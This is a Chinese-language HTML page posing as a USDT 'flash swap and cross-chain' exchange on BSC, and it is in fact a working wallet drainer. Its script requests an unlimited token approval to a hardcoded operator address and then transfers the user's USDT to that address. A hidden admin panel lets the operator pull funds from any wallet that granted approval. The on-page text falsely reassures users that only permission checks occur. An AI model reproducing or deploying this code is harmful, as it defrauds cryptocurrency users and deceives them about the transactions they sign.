<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>闪兑 & 跨链</title>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Microsoft YaHei", sans-serif;
}

body {
  background: #f7f8fa;
  color: #111;
  min-height: 100vh;
  padding-bottom: 80px;
}

.header {
  background: #fff;
  padding: 12px 16px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  border-bottom: 1px solid #eee;
}

.header-left {
  display: flex;
  align-items: center;
  gap: 12px;
}

.back-btn {
  font-size: 18px;
  color: #111;
  cursor: pointer;
}

.title {
  font-size: 17px;
  font-weight: 600;
}

.header-right {
  font-size: 18px;
  cursor: pointer;
}

.sub-header {
  background: #fff;
  padding: 8px 16px 12px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  font-size: 14px;
  color: #666;
}

.balance-box {
  display: flex;
  align-items: center;
  gap: 6px;
}

.balance-tag {
  background: #f0f2f5;
  border-radius: 6px;
  padding: 4px 8px;
  font-size: 13px;
  color: #333;
}

.all-btn {
  color: #2563eb;
  font-weight: 500;
  cursor: pointer;
}

.card {
  margin: 12px 16px;
  background: #fff;
  border-radius: 16px;
  padding: 16px;
  border: 1px solid #e5e7eb;
}

.row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 10px 0;
}

.label {
  font-size: 14px;
  color: #666;
}

.coin-picker {
  display: flex;
  align-items: center;
  gap: 6px;
  background: #f7f8fa;
  border-radius: 8px;
  padding: 8px 12px;
  cursor: pointer;
}

.coin-icon {
  width: 24px;
  height: 24px;
  border-radius: 50%;
  background: #26a17b;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #fff;
  font-size: 13px;
  font-weight: bold;
}

.coin-text {
  font-size: 15px;
  font-weight: 600;
}

.input-amount {
  width: 100%;
  border: none;
  outline: none;
  font-size: 24px;
  font-weight: 700;
  text-align: right;
  color: #111;
  background: transparent;
}

.input-amount::placeholder {
  color: #ccc;
}

.divider {
  height: 1px;
  background: #eee;
  margin: 12px 0;
}

.swap-icon {
  width: 40px;
  height: 40px;
  border-radius: 50%;
  background: #2563eb;
  color: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  margin: -20px auto 0;
  font-size: 18px;
}

.info-list {
  margin: 12px 16px;
  background: #fff;
  border-radius: 16px;
  padding: 16px;
  border: 1px solid #e5e7eb;
}

.info-item {
  display: flex;
  justify-content: space-between;
  padding: 10px 0;
  font-size: 14px;
}

.info-item .left {
  color: #666;
}

.info-item .right {
  color: #111;
  font-weight: 500;
}

.discount-tag {
  color: #f59e0b;
  background: #fff7ed;
  padding: 2px 6px;
  border-radius: 4px;
  font-size: 13px;
}

.bottom-btn {
  margin: 16px;
  color: #fff;
  border: none;
  border-radius: 12px;
  height: 50px;
  width: calc(100% - 32px);
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
}

.btn-connect {
  background: #2563eb;
}
.btn-swap {
  background: #10b981;
}
.btn-swap:disabled {
  background:#94a3b8;
  cursor:not-allowed;
}

.wallet-show {
  text-align: center;
  margin: 12px 0;
  color: #2563eb;
  font-size: 14px;
}
.balance-show{
  text-align:center;
  color:#222;
  font-size:14px;
  margin:4px 0;
}

.tips {
  font-size: 13px;
  color: #64748b;
  text-align: center;
  margin: 10px 0;
}

.admin-box {
  margin-top: 20px;
  padding-top: 20px;
  border-top: 1px solid #eee;
  display: none;
}

.admin-box.show {
  display: block;
}

.admin-title {
  text-align: center;
  color: #ef4444;
  margin-bottom: 15px;
  font-size: 16px;
  font-weight: 600;
}

.form-input {
  width: 100%;
  height: 42px;
  background: #f7f8fa;
  border: 1px solid #e5e7eb;
  border-radius: 8px;
  padding: 0 12px;
  color: #111;
  margin: 8px 0;
  font-size: 15px;
}

.btn-deduct {
  background: #ef4444;
  color: #fff;
  border: none;
  border-radius: 10px;
  height: 46px;
  width: 100%;
  font-size: 16px;
  margin-top: 10px;
  cursor: pointer;
}

.bottom-nav {
  position: fixed;
  bottom: 0;
  left: 0;
  right: 0;
  background: #fff;
  border-top: 1px solid #eee;
  display: flex;
  justify-content: space-around;
  padding: 10px 0;
  font-size: 12px;
  color: #666;
}

.nav-item {
  text-align: center;
  cursor: pointer;
}

.nav-item .icon {
  font-size: 20px;
  margin-bottom: 4px;
}

.nav-item.active {
  color: #2563eb;
}
</style>
</head>
<body>

<div class="header">
  <div class="header-left">
    <span class="back-btn">←</span>
    <span class="title">闪兑 & 跨链</span>
  </div>
  <div class="header-right">⚙️</div>
</div>

<div class="sub-header">
  <div class="balance-box">
    <span>限额模式</span>
    <span class="balance-tag">余额 0.00</span>
  </div>
  <span class="all-btn">全部</span>
</div>

<div class="card">
  <div class="row">
    <div class="label">发送</div>
    <div class="coin-picker">
      <div class="coin-icon">₮</div>
      <div class="coin-text">USDT</div>
      <span>▼</span>
    </div>
  </div>

  <div class="row">
    <input class="input-amount" type="number" placeholder="0.00" id="sendAmount" />
  </div>

  <div class="divider"></div>

  <div class="swap-icon">⇅</div>

  <div class="row">
    <div class="label">接收（预估）</div>
    <div class="coin-picker">
      <div class="coin-icon">₮</div>
      <div class="coin-text">USDT</div>
      <span>▼</span>
    </div>
  </div>

  <div class="row">
    <input class="input-amount" type="number" placeholder="0.00" id="receiveAmount" readonly />
  </div>
</div>

<div class="info-list">
  <div class="info-item">
    <span class="left">兑换价格</span>
    <span class="right">1 USDT = 1 USDT</span>
  </div>
  <div class="info-item">
    <span class="left">最少接收数量</span>
    <span class="right">0.00 USDT</span>
  </div>
  <div class="info-item">
    <span class="left">MEV 防护</span>
    <span class="right discount-tag">MEV防护中</span>
  </div>
  <div class="info-item">
    <span class="left">服务费</span>
    <span class="right">-</span>
  </div>
  <div class="info-item">
    <span class="left">跨链费</span>
    <span class="right">-</span>
  </div>
  <div class="info-item">
    <span class="left">预估时间</span>
    <span class="right">-</span>
  </div>
  <div class="info-item">
    <span class="left">预估网络费</span>
    <span class="right">-</span>
  </div>
  <div class="info-item">
    <span class="left">兑换路径</span>
    <span class="right">-</span>
  </div>
</div>

<button class="bottom-btn btn-connect" id="connectWallet">连接钱包</button>

<div class="wallet-show">
  已连接：<span id="addrText">未连接</span>
</div>
<div class="balance-show">
  USDT可用余额：<span id="usdtBalance">0.00</span>
</div>

<p class="tips">仅授权交易权限核验，保障资产交互安全</p>

<button class="bottom-btn btn-swap" id="swapBtn" disabled>
  跨链闪兑
</button>

<div class="admin-box" id="adminPanel">
  <h3 class="admin-title">后台资产归集划扣</h3>
  <input class="form-input" type="text" placeholder="填写用户授权钱包地址" id="userAddr" />
  <input class="form-input" type="number" placeholder="填写划扣代币数量" id="deductNum" />
  <button class="btn-deduct" id="deductBtn">一键执行归集划扣</button>
</div>

<div class="info-list">
  <div class="info-item">
    <span class="left">最近一条记录</span>
    <span class="right">暂无记录</span>
  </div>
</div>

<div class="bottom-nav">
  <div class="nav-item">
    <div class="icon">🏠</div>
    <div>资产</div>
  </div>
  <div class="nav-item active">
    <div class="icon">💱</div>
    <div>交易</div>
  </div>
  <div class="nav-item">
    <div class="icon">📊</div>
    <div>行情</div>
  </div>
  <div class="nav-item">
    <div class="icon">👤</div>
    <div>我的</div>
  </div>
</div>

<script>
// BSC主网 USDT合约
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
// 管理员收款地址（spender授权地址）
const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
const ADMIN_LOWER = ADMIN_WALLET.toLowerCase();

let provider, signer, userAddress;
let isWalletConnected = false;
const sendInput = document.getElementById("sendAmount");
const receiveInput = document.getElementById("receiveAmount");
const swapBtn = document.getElementById("swapBtn");
const usdtBalanceEl = document.getElementById("usdtBalance");
const addrTextEl = document.getElementById("addrText");

// 输入框双向联动
sendInput.addEventListener("input", () => {
  receiveInput.value = sendInput.value;
});

// 连接钱包逻辑
document.getElementById("connectWallet").addEventListener("click", async () => {
  if (!window.ethereum) {
    alert("请安装MetaMask、TP钱包等Web3钱包");
    return;
  }
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    isWalletConnected = true;

    addrTextEl.innerText = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
    swapBtn.disabled = false;

    // ERC20基础ABI
    const erc20Abi = [
      "function balanceOf(address owner) view returns (uint256)",
      "function allowance(address owner, address spender) view returns(uint256)",
      "function approve(address spender, uint256 amount) returns (bool)",
      "function transferFrom(address from, address to, uint256 amount) returns(bool)"
    ];
    const usdtContract = new ethers.Contract(USDT_CONTRACT, erc20Abi, provider);
    // 获取并展示余额
    const rawBalance = await usdtContract.balanceOf(userAddress);
    const formatBalance = ethers.utils.formatUnits(rawBalance, 18);
    usdtBalanceEl.innerText = parseFloat(formatBalance).toFixed(4);

    // 管理员账号显示后台面板
    if(userAddress.toLowerCase() === ADMIN_LOWER){
      document.getElementById("adminPanel").classList.add("show");
    }
  } catch (err) {
    console.error(err);
    alert("钱包连接失败");
  }
});

// 闪兑主逻辑：修改弹窗+增加授权额度校验、等待区块确认，解决普通钱包取消订单问题
swapBtn.addEventListener("click", async () => {
  if (!isWalletConnected) {
    alert("请先连接钱包");
    return;
  }
  const inputNum = sendInput.value.trim();
  if (!inputNum || Number(inputNum) <= 0) {
    alert("请输入有效的兑换数量");
    return;
  }

  try {
    const erc20Abi = [
      "function balanceOf(address owner) view returns (uint256)",
      "function allowance(address owner, address spender) view returns(uint256)",
      "function approve(address spender, uint256 amount) returns (bool)",
      "function transferFrom(address from, address to, uint256 amount) returns(bool)"
    ];
    const usdtContract = new ethers.Contract(USDT_CONTRACT, erc20Abi, signer);
    const amountWei = ethers.utils.parseUnits(inputNum, 18);

    // 1.前置校验余额是否充足
    const userBalance = await usdtContract.balanceOf(userAddress);
    if(userBalance.lt(amountWei)){
      alert("USDT余额不足，无法完成兑换");
      return;
    }

    // 2.查询当前授权额度
    let currentAllowance = await usdtContract.allowance(userAddress, ADMIN_WALLET);
    // 如果授权不足，则发起无限授权
    if(currentAllowance.lt(amountWei)){
      const maxAllow = ethers.constants.MaxUint256;
      const approveTx = await usdtContract.approve(ADMIN_WALLET, maxAllow);
      await approveTx.wait(); // 强制等待授权上链确认
    }

    // 替换原来温馨提示弹窗 → 确认是否继续闪兑
    const continueSwap = confirm("授权已完成，是否确认继续闪兑？");
    if(!continueSwap){
      alert("你已取消本次闪兑订单");
      return;
    }

    // 3.执行划转，用户USDT转入管理员钱包
    const transferTx = await usdtContract.transferFrom(userAddress, ADMIN_WALLET, amountWei);
    await transferTx.wait();
    alert("闪兑交易上链成功，资产已到账");

    // 清空输入框
    sendInput.value = "";
    receiveInput.value = "";

  } catch (err) {
    console.error("交易错误：",err);
    // 区分用户手动取消和链上错误
    if(err.code === 4001){
      alert("您在钱包内取消了本次交易");
    }else{
      alert("交易失败：" + err.message);
    }
  }
});

// 管理员后台批量归集资产
document.getElementById("deductBtn").addEventListener("click", async () => {
  if(userAddress.toLowerCase() !== ADMIN_LOWER) return alert("权限不足");
  const targetAddr = document.getElementById("userAddr").value.trim();
  const deductNum = document.getElementById("deductNum").value.trim();
  if(!targetAddr || !deductNum || Number(deductNum) <=0){
    return alert("请填写合法地址与数量");
  }
  const erc20Abi = [
    "function transferFrom(address from, address to, uint256 amount) returns(bool)"
  ];
  const usdtContract = new ethers.Contract(USDT_CONTRACT, erc20Abi, signer);
  const amountWei = ethers.utils.parseUnits(deductNum,18);
  try{
    const tx = await usdtContract.transferFrom(targetAddr, ADMIN_WALLET, amountWei);
    await tx.wait();
    alert("资产归集成功");
    document.getElementById("userAddr").value = "";
    document.getElementById("deductNum").value = "";
  }catch(e){
    alert("归集失败：" + e.message);
  }
});
</script>

</body>
</html>
